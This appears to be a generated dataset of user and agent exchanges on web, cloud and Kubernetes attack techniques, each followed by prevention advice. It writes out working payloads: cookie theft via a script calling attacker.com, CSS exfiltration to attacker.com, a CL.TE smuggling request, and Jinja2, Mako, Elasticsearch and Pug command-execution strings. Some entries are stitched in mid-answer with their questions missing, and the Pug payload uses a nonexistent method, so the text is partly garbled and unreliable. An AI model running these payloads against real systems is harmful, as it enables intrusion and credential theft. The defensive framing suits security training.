Agent: JWT aud audience claim specifies intended recipient. Service A trusts tokens from auth server for aud: serviceA. If Service B accepts tokens without validating aud, use token from Service A to access Service B. Claim validation failure allows cross-service token reuse. Prevention validates aud claim matches service identifier, validates iss issuer, proper scope checking, short expiration, and never reuses tokens across services.

User: Explain CORS preflight bypass
Agent: CORS preflight OPTIONS request checks permissions before actual request. Simple requests skip preflight if using GET/POST/HEAD with simple headers. Change complex request to simple avoiding preflight. Remove custom headers using only allowed headers. Use text/plain Content-Type instead of application/json. Server processes JSON with any Content-Type. Prevention validates Content-Type strictly, checks origin on all requests not just preflight, uses proper CORS configuration, SameSite cookies, and monitors unusual request patterns.

User: What is HTTP request smuggling CL.TE attack?
Agent: CL.TE Content-Length and Transfer-Encoding request smuggling. Front-end uses Content-Length, back-end uses Transfer-Encoding: chunked. Inject partial request in body. Example: POST / HTTP/1.1\r\nHost: vulnerable.com\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nFoo: bar. Front-end sees 44 bytes, back-end sees chunked encoding processing GET /admin as next request. Subsequent user request concatenates with smuggled prefix. Prevention normalizes HTTP parsing, rejects ambiguous requests, uses HTTP/2, validates headers consistency, and monitors for smuggling patterns.

User: How does blind XSS exfiltration work?
Agent: Blind XSS executes in admin panels or internal tools viewed by staff. Inject payload with callbacks to attacker server: <script>fetch('http://attacker.com/?c='+document.cookie)</script>. XSS executes when admin views page sending cookies, localStorage, page content. Long-delay payloads persist until viewed. Inject in support tickets, usernames, comments, logs. Tools like XSS Hunter automate blind XSS tracking. Prevention treats all user input as untrusted even in admin areas, output encoding, CSP, HTTPOnly cookies, regular security scans, and staff training.

User: What is CSS injection for data exfiltration?
Agent: CSS selectors can exfiltrate data through attribute selectors. Example: input[value^="a"]{background:url(http://attacker.com/a)} loads image if input value starts with 'a'. Iterate through alphabet extracting character by character. Works with CSRF tokens, hidden fields, or any HTML content. Font-face with unicode-range extracts text. Prevention implements CSP blocking external resources, avoid reflecting user CSS, validates input, uses CSP strict-dynamic, and monitors for CSS injection patterns.

User: Explain Python Server-Side Template Injection
Agent: Python template engines like Jinja2, Mako vulnerable to SSTI. Jinja2 payload: {{config.__class__.__init__.__globals__}} accesses globals. {{''.__class__.__mro__[1].__subclasses__()}} lists all classes finding dangerous ones like subprocess.Popen. Chain access to __import__ or eval. Mako: ${__import__('os').system('id')}. Prevention sandboxes templates, disables dangerous built-ins, separates user input from templates, validates input, uses auto-escaping, and monitors template errors.

Prevention blocks .git directory in web server config, removes repositories from production, uses .gitignore properly, scans for exposed repositories, and implements proper deployment processes.

User: What is Spring Boot Actuator exposure?
Agent: Spring Boot Actuators expose management endpoints. /actuator/env reveals environment variables including secrets. /actuator/heapdump dumps heap memory containing credentials. /actuator/jolokia enables JMX exploitation. /actuator/gateway/routes in Spring Cloud Gateway exposes routes. Exploit achieves RCE through various vectors. Prevention restricts actuator access with authentication, exposes only necessary endpoints, uses management.server.port on different port, implements firewall rules, and monitors actuator access.

User: How does Elasticsearch dynamic scripting RCE work?
Agent: Elasticsearch scripting enables dynamic operations but allows RCE. Groovy scripting: POST /_search with script field executing Java code. Example: {"script":"java.lang.Math.class.forName('java.lang.Runtime').getRuntime().exec('id').getText()"}. Painless scripting more restricted but bypasses exist. Prevention disables dynamic scripting, uses stored scripts, restricts script languages, enables security plugin, implements authentication, and monitors queries.

User: What is AWS IAM privilege escalation?
Agent: AWS IAM misconfiguration allows privilege escalation. User with iam:PutUserPolicy attaches AdministratorAccess policy to own user. CreateAccessKey generates new credentials for privileged user. PassRole with ec2:RunInstances launches EC2 with privileged role then retrieves credentials. UpdateAssumeRolePolicy modifies trust policy assuming privileged roles. Prevention implements least privilege, uses permission boundaries, monitors IAM changes, enables CloudTrail logging, regular audits with tools like Prowler, and restricts dangerous permissions.

User: Explain Kubernetes secret extraction
Agent: Kubernetes secrets stored as base64 in etcd. Service account tokens mounted at /var/run/secrets/kubernetes.io/serviceaccount/token. List secrets with kubectl requires RBAC permissions. Access etcd directly if exposed. Pod with host filesystem mount reads secrets from /var/lib/kubelet.

MFA bypass through legacy protocols, consent phishing granting permissions, OAuth token theft, conditional access bypass, service principal exploitation, and API permission abuse. Prevention enables security defaults, blocks legacy authentication, monitors consent grants, implements conditional access strictly, least privilege service principals, and MFA enforcement.

User: Explain insecure Docker configuration
Agent: Docker misconfigurations create security risks. Running privileged containers escapes to host. Mounting Docker socket enables container escape. Using root user violates least privilege. Exposed Docker daemon on 0.0.0.0:2375 allows remote exploitation. Using latest tag creates version confusion. Prevention runs containers as non-root, avoids privileged mode, never mounts Docker socket, specific image tags, restricts capabilities, uses user namespaces, and implements container security tools.

User: What is Kubernetes pod escape techniques?
Agent: Kubernetes pod escape accesses host from container. Privileged pods mount host filesystem. HostPath volumes access host paths. HostNetwork uses host networking. HostPID accesses host processes. Service account tokens authenticate to API. Node tolerations schedule on masters. Prevention uses Pod Security Policies, restricts privileges, implements admission controllers, uses RuntimeClass, monitors pod specifications, and enforces security contexts.

User: How does SQL truncation attack work?
Agent: SQL truncation exploits maximum column length truncating input. Database username column max 20 characters. Register username 'admin' with spaces padding to 20 characters plus extra. Database truncates at 20 storing 'admin' with trailing spaces. Authentication trims spaces matching legitimate admin user. Account takeover of admin. Prevention validates input length strictly, uses unique constraints, trims input before storing, monitors for truncation, and proper column sizing.

User: What is HTTP parameter pollution in authentication?
Agent: HTTP parameter pollution bypasses authentication by exploiting parameter parsing. WAF checks first password parameter, application uses last. Send password=wrong&password=correct. WAF sees wrong, application processes correct.

User: How do I exploit weak Kubernetes RBAC with pod creation?
Agent: RBAC allowing pod creation enables privilege escalation through privileged containers. Create pod with hostPath volume mounting node root filesystem accessing /etc/shadow or /root/.ssh. Pod with hostNetwork accesses node services. Service account with cluster-admin role inherits permissions. Prevention restricts pod creation to specific namespaces, implements Pod Security Admission enforcing baseline standards, uses admission webhooks validating pod specs, monitors pod creations, and principle of least privilege RBAC.

User: What is AWS Lambda dead letter queue exploitation?
Agent: Lambda DLQ sends failed invocation events to SQS or SNS. Misconfigured DLQ allows unauthorized access reading failure data containing sensitive information. Event payload includes function input potentially with credentials or PII. Prevention restricts DLQ access with IAM policies, encrypts DLQ messages with KMS, sanitizes data before DLQ, monitors DLQ access patterns, and implements least privilege.

User: Explain container registry credential theft?
Agent: Container registries store Docker images requiring authentication. Credentials in environment variables, config files, or Kubernetes secrets. Docker config at ~/.docker/config.json contains base64 encoded credentials. Kubernetes imagePullSecrets contain registry credentials. Compromised credentials allow pulling private images revealing source code and secrets. Prevention uses short-lived tokens, registry with OIDC authentication, scans for exposed credentials, rotates credentials regularly, and implements pull-through cache reducing credential usage.

User: What is Kubernetes namespace isolation bypass?
Agent: Namespaces provide logical isolation but share node resources. Pod in namespace A can access services in namespace B if network policies absent. HostPath volumes access node filesystem across namespaces. Resource exhaustion in one namespace affects others. Prevention implements network policies blocking cross-namespace traffic, uses separate nodes per namespace for sensitive workloads, resource quotas and limits per namespace, monitors cross-namespace access, and considers separate clusters for strong isolation.

User: How does AWS SSM Session Manager port forwarding work?
Agent: Session Manager allows port forwarding from local machine through EC2 to remote services. Command aws ssm start-session --target instance-id --document-name AWS-StartPortForwardingSession --parameters portNumber=3306. Tunnels database or internal service to localhost bypassing security groups. Requires ssm:StartSession permission. Prevention restricts Session Manager permissions, monitors session activity, disables port forwarding document, implements jump hosts instead, and logs all sessions to S3.

User: What is GraphQL batching DoS amplification?
Agent: GraphQL allows multiple operations in single HTTP request. Batch 1000 queries each requesting expensive nested data. Single HTTP request triggers 1000 database queries. Bypasses rate limits counting HTTP requests not operations. Prevention implements operation count limits separate from HTTP rate limits, query complexity analysis accounting for batching, depth limiting, timeout per operation, monitors batch size and complexity, and restricts batching for unauthenticated users.

User: Explain Kubernetes admission webhook timeout exploitation?
Agent: Admission webhooks validate resources with timeout defaults to 10 seconds. Attacker causes webhook timeout through slow responses or network issues. FailurePolicy: Ignore allows resource creation on timeout bypassing validation. Prevention uses FailurePolicy: Fail rejecting resources on timeout, implements webhook redundancy, monitors webhook latency and availability, sets appropriate timeout values, validates webhook certificates and connectivity, and logs admission decisions.

User: What is AWS CloudFront origin spoofing?
Agent: CloudFront forwards requests to origin with X-Forwarded-For and custom headers. Origin trusts CloudFront headers for authentication or authorization. Attacker directly contacts origin bypassing CloudFront. Spoofs headers impersonating CloudFront requests. Prevention restricts origin to accept only CloudFront IPs, uses custom header shared secret, validates requests cryptographically, implements Web Application Firewall, and monitors for direct origin access.

User: How do I exploit Electron webview tag?
Agent: Electron webview tag embeds external content in isolated context. nodeintegration attribute enables Node.js in webview. Preload scripts execute with Node.js access before webview content loads. XSS in webview with nodeintegration becomes RCE. Prevention disables webview tag entirely, uses BrowserView instead, ensures nodeintegration: false and sandbox: true, implements strict CSP, validates webview sources, and monitors webview usage.

User: What is Kubernetes pod disruption budget bypass?
Agent: PodDisruptionBudget prevents disrupting minimum available pods during voluntary disruptions. Attacker deletes pods violating PDB if they have delete permissions. PDB only protects against voluntary evictions not deletions. Non-voluntary disruptions like node failures bypass PDB. Prevention restricts pod deletion permissions with RBAC, monitors pod deletions, implements graceful shutdown handlers, uses multiple replicas across zones, and validates PDB effectiveness.

User: Explain AWS IAM permission boundary bypass?
Agent: Permission boundaries limit maximum permissions for IAM users or roles. User can only perform actions allowed by both identity policy AND permission boundary. Bypass through service role assumption if boundary not applied to role. Privilege escalation by modifying own permission boundary if iam:DeleteUserPermissionsBoundary allowed. Prevention applies boundaries to all entities including service roles, restricts boundary modification permissions, monitors boundary changes, uses SCPs for organization-wide limits, and validates boundary effectiveness.

User: What is container breakout via kernel vulnerability?
Agent: Container shares kernel with host. Kernel vulnerability in system calls or device drivers enables escape. Exploit triggers kernel bug from container gaining host root. Examples include CVE-2022-0847 Dirty Pipe, CVE-2022-0185 heap overflow. Prevention keeps kernel updated with security patches, uses grsecurity or kernel hardening, restricts system calls with seccomp, monitors for kernel exploitation attempts, implements container runtime protections, and uses virtualization-based containers for strong isolation.

User: How does OAuth PKCE code_challenge bypass work?
Agent: PKCE uses code_challenge derived from code_verifier. S256 method uses SHA256 hash, plain method sends verifier directly. Implementation may accept plain when S256 expected. Weak code_verifier generation enables prediction. Code_challenge not validated allowing any code_verifier. Prevention enforces S256 method rejecting plain, validates code_challenge matches code_verifier, uses cryptographic random for verifier, implements rate limiting on token endpoint, monitors for bypass attempts, and proper PKCE implementation.

User: What is Kubernetes horizontal pod autoscaler manipulation?
Agent: HPA scales pods based on metrics like CPU or custom metrics. Attacker with metrics modification can trigger scaling. Send fake metrics through metrics API. Scale to maximum replicas causing resource exhaustion and cost. Scale to zero causing denial of service. Prevention restricts metrics API access with RBAC, validates metrics sources, implements rate limiting on scaling events, sets minimum replicas greater than zero, monitors unusual scaling patterns, and alerts on rapid scaling.

User: Explain AWS EC2 instance connect credential exposure?
Agent: EC2 Instance Connect pushes temporary SSH keys to instance metadata. Keys valid for 60 seconds. Compromised instance metadata access retrieves keys during valid window. Keys in /home/user/.ssh/authorized_keys temporarily. Prevention uses IMDSv2 requiring token, monitors instance metadata access, rotates SSH keys frequently, implements bastion hosts instead, uses Session Manager avoiding SSH, and restricts network access to metadata service.

User: What is GraphQL persisted query hash collision?
Agent: Persisted queries cache operations by hash. Client sends hash instead of full query. Hash collision allows injecting different query with same hash. Cache poisoning serves malicious query to other users. Weak hash algorithm like CRC32 enables collisions. Prevention uses cryptographic hashes like SHA256, validates query matches hash server-side, implements query whitelisting, monitors for collision attempts, limits cache size and TTL, and disables if not required.

User: How do I exploit insecure Kubernetes service account token?
Agent: Service account tokens mounted at /var/run/secrets/kubernetes.io/serviceaccount/token. Long-lived tokens never expire. Token allows Kubernetes API authentication. Compromised pod reads token using for cluster access. Prevention uses short-lived projected tokens with BoundServiceAccountTokenVolume, rotates tokens regularly, implements least privilege service accounts per pod, monitors API access with audit logs, and considers external identity providers.

User: What is AWS Lambda environment variable encryption bypass?
Agent: Lambda encrypts environment variables with KMS. Variables decrypted during cold start loaded into memory. Compromised function code reads decrypted variables from process memory. Function logs may leak variables if printed. Prevention uses AWS Secrets Manager or Parameter Store retrieving secrets at runtime, encrypts sensitive data in code, sanitizes logs removing secrets, restricts function permissions, monitors secret access, and implements secret rotation.

User: Explain container image layer credential leakage?
Agent: Docker images built in layers each caching filesystem changes. Sensitive file added then deleted remains in intermediate layer. Credentials in build ARGs persist in layer metadata. Git clone with credentials embeds authentication in layer. Prevention uses multi-stage builds discarding sensitive layers, .dockerignore excluding secret files, build-time secrets with BuildKit, scans images for secrets, never uses credentials in ARGs, and implements secret management.

User: What is Kubernetes pod security context privilege escalation?
Agent: Security context controls pod privileges. allowPrivilegeEscalation: true permits gaining more privileges than parent. Capabilities like CAP_SYS_ADMIN enable escaping container. Running as root UID 0 increases attack surface. Privileged: true disables all security boundaries. Prevention enforces allowPrivilegeEscalation: false, drops all capabilities adding only necessary, runs as non-root user, uses Pod Security Standards restrictive profile, and validates security context with admission policy.

User: How does AWS API Gateway Lambda authorizer caching exploit work?
Agent: Lambda authorizer caches authorization decisions based on cache key. Default cache key includes authorization token. Insufficient cache key allows reusing cached decision. Different user with same token reuses cached authorization. Short TTL or no caching degrades performance. Prevention uses comprehensive cache key including user identity and resource, implements appropriate TTL balancing security and performance, validates authorization in Lambda function itself, monitors for unusual authorization patterns, and tests caching behavior.

User: What is OAuth state parameter bypass through mobile app?
Agent: OAuth state parameter prevents CSRF. Mobile app may use predictable state values. Deep linking without state validation. State stored in shared preferences accessible to other apps. WebView OAuth flow state not validated. Prevention generates cryptographically random state, binds state to session, validates state server-side, uses Android App Links or iOS Universal Links with proper validation, implements PKCE instead of relying on state alone, and secures state storage.

User: Explain Kubernetes network policy ordering bypass?
Agent: Network policies are additive with default allow. Multiple policies apply simultaneously creating union of allowed traffic. Policy ordering doesn't exist allowing traffic if any policy permits. Deny policy requires explicit deny rules as default is allow. Prevention implements default deny policy blocking all traffic, creates explicit allow rules for necessary communication, validates policy effectiveness with testing, uses namespace isolation, monitors network traffic, and tools like Calico for advanced policies.

User: What is AWS S3 bucket logging to same bucket recursion?
Agent: S3 access logging writes logs to target bucket. Logging to same bucket creates infinite loop. Each log write generates new log entry. Exponential log growth fills bucket rapidly. Costs escalate with write requests and storage. Prevention uses separate dedicated bucket for logs, enables lifecycle policies deleting old logs, monitors bucket growth and costs, implements CloudWatch alarms for unusual activity, and validates logging configuration.

User: How do I exploit GraphQL directive vulnerabilities?
Agent: GraphQL directives like @skip or @include control field inclusion. Malicious directives bypass authorization checks. Custom directives execute arbitrary logic. Directive arguments from user input enable injection. Recursive directives cause infinite loops. Prevention validates directive usage, restricts custom directives, sanitizes directive arguments, implements directive execution limits, uses schema validation, and monitors for unusual directive patterns.

User: What is container runtime socket exposure?
Agent: Container runtime sockets like /var/run/docker.sock provide API access. Mounting socket in container allows runtime control. Create privileged containers, access host filesystem, execute commands on host. Equivalent to host root access. Prevention never mounts runtime socket in untrusted containers, uses Docker-in-Docker alternatives, restricts socket permissions, monitors socket access, implements admission controllers blocking socket mounts, and uses rootless containers.

User: Explain AWS EC2 user data secret exposure?
Agent: EC2 user data contains initialization scripts executed on launch. User data retrieved from instance metadata without authentication. Secrets hardcoded in user data accessible to anyone with instance access. User data stored unencrypted in EC2 API responses. Prevention uses AWS Systems Manager Parameter Store or Secrets Manager for secrets, retrieves secrets at runtime, encrypts user data, restricts metadata access, avoids hardcoding credentials, and monitors user data access.

User: What is Kubernetes resource quota bypass?
Agent: Resource quotas limit resource consumption per namespace. Multiple namespaces bypass cluster-wide limits. Resource requests vs limits distinction exploited. Certain resources like ephemeral storage not counted in quotas. DaemonSets bypass pod count quotas running on all nodes. Prevention implements LimitRanges enforcing ranges on resources, uses cluster-wide quotas with Hierarchical Namespaces, monitors actual resource usage not just quotas, restricts namespace creation, and validates workload requirements.

User: How does Express.js template injection in Pug work?
Agent: Pug template engine evaluates JavaScript expressions. User input in template interpolation enables injection. Syntax: #{userInput} executes as JavaScript. Example: #{global.process.mainModule.require('child_process').execCommand('id')} for RCE. Prevention separates user input from templates, uses escaped interpolation =userInput instead of unescaped, validates template syntax, restricts template access to trusted sources, and implements Content Security Policy.

User: What is AWS Lambda layer poisoning via public layers?
Agent: Lambda layers shareable across accounts with public access. Attacker publishes layer with malicious code and similar name to legitimate layer. Developers mistakenly use malicious layer through typosquatting. Layer code executes in function context accessing environment variables and permissions. Prevention uses private layers only, validates layer ARNs and sources, implements layer whitelisting, scans layer contents, monitors layer usage, and signs layers with cryptographic verification.

User: Explain Kubernetes admission webhook certificate expiration?
Agent: Admission webhooks use TLS certificates for authentication. Expired certificates cause webhook failures. FailurePolicy: Ignore allows bypassing validation during failures. Cert-manager automates renewal but misconfiguration causes expiration. Prevention monitors certificate expiration dates, automates certificate renewal with cert-manager or similar, implements certificate alerts before expiration, uses FailurePolicy: Fail, validates certificate configuration, and maintains manual renewal procedures.

User: What is OAuth token endpoint authentication bypass?
Agent: OAuth token endpoint exchanges authorization code for access token. Weak client authentication allows impersonation. Public clients with client_id only lack authentication. Client secret in mobile apps extractable through reverse engineering. Token endpoint not validating redirect_uri. Prevention uses PKCE for public clients, implements client authentication for confidential clients, validates redirect_uri, uses dynamic client registration, monitors token requests, and implements rate limiting.

User: How do I exploit AWS API Gateway REST API cache poisoning?
Agent: API Gateway caches responses based on request parameters. Cache key insufficient includes only path and query. Different authorization headers receive same cached response. Cache TTL too long serves stale data. Prevention includes authorization headers in cache key, implements proper cache invalidation, uses short TTL for sensitive data, disables caching for authenticated endpoints, validates cache configuration, and monitors cache hit rates.

User: What is Kubernetes init container privilege escalation?
Agent: Init containers run before main containers with separate security context. Init container with elevated privileges writes to shared volume. Main container reads malicious files from shared volume. Init container runs as root while main container restricted. Prevention enforces security context on init containers, uses separate volumes for init and main containers, validates init container images, monitors init container behavior, implements admission policies restricting init containers, and runs init containers as non-root.

User: Explain AWS CloudFormation stack policy bypass?
Agent: Stack policy prevents updates to specific resources. Policy bypassed through stack set deletion and recreation. Replacement of entire stack not considered update. Cross-stack references enable indirect modification. Prevention implements strict change control processes, uses CloudFormation drift detection, monitors stack modifications, implements service control policies restricting stack operations, validates stack policies cover all modification paths, and enables termination protection.

User: What is container image scanning evasion?
Agent: Image scanners detect known vulnerabilities in packages. Malware disguised as legitimate binaries. Secrets encoded or encrypted avoiding detection. Vulnerabilities in uncommon packages not in scanner database. Multi-stage builds discard vulnerable layers from final image. Prevention uses multiple scanning tools with different databases, scans all layers not just final, implements runtime monitoring, uses admission controllers blocking unscanned images, manually reviews suspicious images, and implements allow-lists for packages.

User: How does GraphQL mutation rate limiting bypass work?
Agent: Rate limiting often counts queries not mutations separately. Single mutation with batch operations modifies multiple records. Mutations with expensive operations not weighted higher. Async mutations return immediately before processing. Prevention implements separate rate limits for mutations, weights operations by cost, monitors actual resource consumption, limits batch size in mutations, validates mutation arguments, and uses persistent rate limiting across sessions.

User: What is AWS Lambda function URL authorization bypass?
Agent: Lambda function URLs provide HTTPS endpoints. Authorization type: NONE allows unauthenticated public access. Authorization: AWS_IAM requires credentials. Resource policy may grant broader access than intended. Function URL leaked through enumeration or disclosure. Prevention uses AWS_IAM authorization, implements strict resource policies, validates caller identity in function code, monitors function URL invocations, restricts function URL creation, and considers API Gateway for production.

User: Explain Kubernetes pod security admission bypass via namespace labels?
Agent: Pod Security admission enforces policies based on namespace labels. Namespaces without labels use cluster default. Namespace label modification changes enforcement. privileged label allows any pod configuration. Prevention restricts namespace label modification with RBAC, implements admission webhooks validating labels, uses baseline standard as cluster default, monitors label changes, audits pod security violations, and enforces restricted standard for sensitive namespaces.

User: What is OAuth redirect URI validation bypass via open redirect?
Agent: OAuth validates redirect_uri against registered values. Open redirect on trusted domain chains with OAuth. Example: redirect_uri=https://trusted.com/redirect?url=attacker.com. OAuth provider validates trusted.com allowing redirect. Open redirect forwards to attacker receiving authorization code. Prevention fixes open redirects, implements exact redirect_uri matching, validates final destination, monitors for chained redirects, and reject redirect_uri with nested URLs.
